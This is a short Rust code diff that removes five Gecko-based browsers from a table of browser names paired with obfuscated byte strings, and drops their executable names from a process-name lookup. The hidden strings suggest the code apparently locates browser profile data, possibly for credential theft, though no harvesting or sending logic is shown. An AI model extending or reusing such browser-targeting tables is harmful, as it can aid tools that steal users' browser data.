@@ -42,25 +42,6 @@ static GECKO_BROWSERS: Lazy<Vec<(&'static str, String)>> = Lazy::new(|| {
                 0xD2, 0xDB, 0xD8, 0x90, 0xCE, 0xD2, 0xCE, 0xCF,
             ]),
         ),
-        (
-            "Basilisk",
-            deobf(&[0x91, 0xDC, 0x90, 0xD4, 0xDB, 0xD4, 0x90, 0xDA]),
-        ),
-        (
-            "K-Meleon",
-            deobf(&[0x88, 0x90, 0x8E, 0xD8, 0xDB, 0xD8, 0xCE, 0xCF]),
-        ),
-        (
-            "GNU IceCat",
-            deobf(&[
-                0x84, 0x9D, 0x96, 0x90, 0xAC, 0x8A, 0xCE, 0xD8, 0x80, 0xDC, 0xD3,
-            ]),
-        ),
-        (
-            "Conkeror",
-            deobf(&[0x80, 0xCE, 0xCF, 0xDA, 0xD8, 0xCF, 0xDA, 0xCF]),
-        ),
-        ("Flock", deobf(&[0x85, 0xDB, 0xCE, 0xDA, 0xCB])),
     ]
 });
 
@@ -232,11 +213,6 @@ fn gecko_process_name(browser: &str) -> &'static str {
         "SeaMonkey" => "seamonkey.exe",
         "Waterfox" => "waterfox.exe",
         "Pale Moon" => "palemoon.exe",
-        "Basilisk" => "basilisk.exe",
-        "K-Meleon" => "kmeleon.exe",
-        "GNU IceCat" => "icecat.exe",
-        "Conkeror" => "conkeror.exe",
-        "Flock" => "flock.exe",
         _ => "firefox.exe",
     }
 }
